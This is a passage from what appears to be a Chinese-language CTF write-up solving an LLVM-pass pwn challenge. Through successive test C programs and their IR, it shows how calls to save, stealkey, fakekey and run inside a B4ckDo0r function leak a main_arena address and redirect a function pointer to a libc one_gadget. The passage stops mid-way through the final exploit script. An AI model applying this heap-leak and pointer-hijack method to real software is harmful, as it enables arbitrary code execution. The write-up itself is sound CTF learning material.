nounwind optnone uwtable</span><br><span class="line">define dso_local void @fakekey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @run() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @B4ckDo0r() #0 &#123;</span><br><span class="line">  %1 = alloca i32, align 4</span><br><span class="line">  store i32 0, i32* %1, align 4</span><br><span class="line">  call void @save()</span><br><span class="line">  call void @takeaway()</span><br><span class="line">  call void @stealkey()</span><br><span class="line">  call void @fakekey()</span><br><span class="line">  call void @run()</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 10.0.0-4ubuntu1 &quot;&#125;</span><br></pre></td></tr></table></figure><p>在遍历到B4ckDo0r函数的save函数调用时，发现有一个判断条件通不过：<br><code>if ( -1431655765 * (unsigned int)((v15 + 24 * v18 - 24 * (unsigned __int64)NumTotalBundleOperands - v20) &gt;&gt; 3) == 2 )</code></p><p>推测是函数返回值或参数类型不匹配的问题，于是开始了长时间的调试和修改。</p><p>这里发现使用clang-10生成的.ll文件丢到opt里面会报错，本题使用的clang版本为clang-8，解决方法是：<code>apt install clang-8</code>，然后使用clang-8生成.ll文件。</p><p>经过调试发现，上面的一长串语句的等号左边值为函数的参数个数。也就是说，save函数需要有两个参数。于是我们有了第二个测试代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">save(<span class="string">&quot;follow&quot;</span>, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">takeaway();</span><br><span class="line">stealkey();</span><br><span class="line">fakekey();</span><br><span class="line">run();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [7 x i8] c&quot;123456\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [7 x i8] c&quot;654321\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [7 x i8] c&quot;abcdef\00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [7 x i8] c&quot;fedcba\00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [7 x i8] c&quot;888888\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [7 x i8] c&quot;follow\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [11 x i8] c&quot;helloworld\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save(i8*, i8*) #0 &#123;</span><br><span class="line">  %3 = alloca i8*, align 8</span><br><span class="line">  %4 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %3, align 8</span><br><span class="line">  store i8* %1, i8** %4, align 8</span><br><span class="line">  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @takeaway() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @stealkey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @fakekey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @run() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @B4ckDo0r() #0 &#123;</span><br><span class="line">  call void @save(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0))</span><br><span class="line">  call void @takeaway()</span><br><span class="line">  call void @stealkey()</span><br><span class="line">  call void @fakekey()</span><br><span class="line">  call void @run()</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 8.0.1-9 (tags/RELEASE_801/final)&quot;&#125;</span><br></pre></td></tr></table></figure><p>经过调试发现，对于上面有两个参数的save函数，.so库中的方法将其传入的函数的两个实参的内容拷贝到了一个chunk中，这是两个memcpy函数干的事情。之后的两个判断条件也是直接绕过，没有执行delete。</p><p>而第二条调用takeaway的语句的识别中，也有一个关于参数个数的判断：<br><code>if ( -1431655765 * (unsigned int)((v15 + 24 * v38 - 24 * (unsigned __int64)v39 - v40) &gt;&gt; 3) != 1 )</code><br>设置其有一个参数即可通过该检查。</p><p>于是有第三个测试代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">save(<span class="string">&quot;follow&quot;</span>, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">takeaway(<span class="string">&quot;colin&quot;</span>);</span><br><span class="line">stealkey();</span><br><span class="line">fakekey();</span><br><span class="line">run();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [7 x i8] c&quot;123456\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [7 x i8] c&quot;654321\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [7 x i8] c&quot;abcdef\00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [7 x i8] c&quot;fedcba\00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [7 x i8] c&quot;888888\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [7 x i8] c&quot;follow\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [11 x i8] c&quot;helloworld\00&quot;, align 1</span><br><span class="line">@.str.7 = private unnamed_addr constant [6 x i8] c&quot;colin\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save(i8*, i8*) #0 &#123;</span><br><span class="line">  %3 = alloca i8*, align 8</span><br><span class="line">  %4 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %3, align 8</span><br><span class="line">  store i8* %1, i8** %4, align 8</span><br><span class="line">  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @takeaway(i8*) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @stealkey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @fakekey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @run() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @B4ckDo0r() #0 &#123;</span><br><span class="line">  call void @save(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0))</span><br><span class="line">  call void @takeaway(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0))</span><br><span class="line">  call void @stealkey()</span><br><span class="line">  call void @fakekey()</span><br><span class="line">  call void @run()</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 8.0.1-9 (tags/RELEASE_801/final)&quot;&#125;</span><br></pre></td></tr></table></figure><p>进入调试后发现在takeaway中某处会产生段错误，原因不明。暂且删除takeaway的调用，跳过。</p><p>在stealkey中，发现在语句<code>byte_204100 = *key_chunk;</code>（key_chunk就是.so中偏移0x2040F8的位置）执行前，之前save创建的chunk中保存的是一个chunk的地址，里面有save函数的两个实参的值。然后stealkey将这个chunk中的前8字节取了出来保存。</p><p><img src="https://img-blog.csdnimg.cn/9ede0a00ffcb4dafaa9e0ecaca30890b.png"><br>后面的fakekey同样需要传入一个参数，因此有第四个测试代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">save(<span class="string">&quot;follow&quot;</span>, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">stealkey();</span><br><span class="line">fakekey(<span class="string">&quot;colin&quot;</span>);</span><br><span class="line">run();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经调试发现，fakekey中关键操作前面的判断通不过，对关键地址没有任何影响：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>由于getSExtValue的含义是get signed extended value，获得有符号扩展的数，推测与参数有关，既然是数，猜测参数对类型有要求：必须是一个整数。于是修改了fakekey的参数类型，再次尝试。</p><p><img src="https://img-blog.csdnimg.cn/54f1bb141a9640cd86c6c1d50d32b71f.png"><br>成功通过判断条件。随后的getSExtValue函数确实返回了fakekey的第一个参数值，并将关键地址处的值加上了这个参数值。随后的run函数中就以该地址的值作为函数指针调用。由此，流程分析基本完成，思路逐渐清晰。</p><p>现在我们已知能够控制一个函数指针的值。本题给出的libc是2.27版本，可以使用one_gadget工具获取one_gadget，在此之后还有一个问题：如何获取libc的基地址并保存到这个地址中？要知道，我们能够任意修改key_chunk中值的唯二的方法是：①通过save函数的第一个参数修改；②通过fakekey函数的第一个参数修改。但是别忘了，key_chunk保存的是一个chunk指针，既然是chunk就有可能分配到原来是free chunk的chunk。如果这原来是一个unsorted bin chunk，那么fd指针处保存的不就正是main_arena处的地址吗？如果我们将save函数的第一个参数设置为’\x00’，由于memcpy函数拷贝的长度是根据字符串的长度来计算，因此save函数此时就不会覆盖这里的地址值，我们也就能够获取到main_arena中的地址了。以此为基础使用fakekey函数加上一个值让它指向one_gadget，这不就成了吗？</p><p><img src="https://img-blog.csdnimg.cn/cfc24de6efe54e25a64c2d884b1a7f5e.png"><br>这是程序遍历到B4ckDo0r函数的时候的bins情况，发现0x20大小的tcache bin中有7个chunk。可以先将这7个分配出来，然后就可以通过切割unsorted bin的方式拿到main_arena的地址。</p><p>在给出的libc中，main_arena的偏移为0x3EBC40，unsorted bin的链表头地址为0x3EBCB0。以下面的libc来计算偏移。当然由于笔者是在ubuntu 20.04上面调试，因此使用本机的libc计算偏移，看看能不能在2.31的环境下打通。</p><p><img src="https://img-blog.csdnimg.cn/08b217905d6b4be48fcab00a9bff8e0a.png"><br>在笔者的libc中，unsorted bin链表头地址为0x1ECBF0，one_gadget如下：<br><img src="https://img-blog.csdnimg.cn/aae5e172a11d472ea868a031037768eb.png"><br>于是有下面的脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title 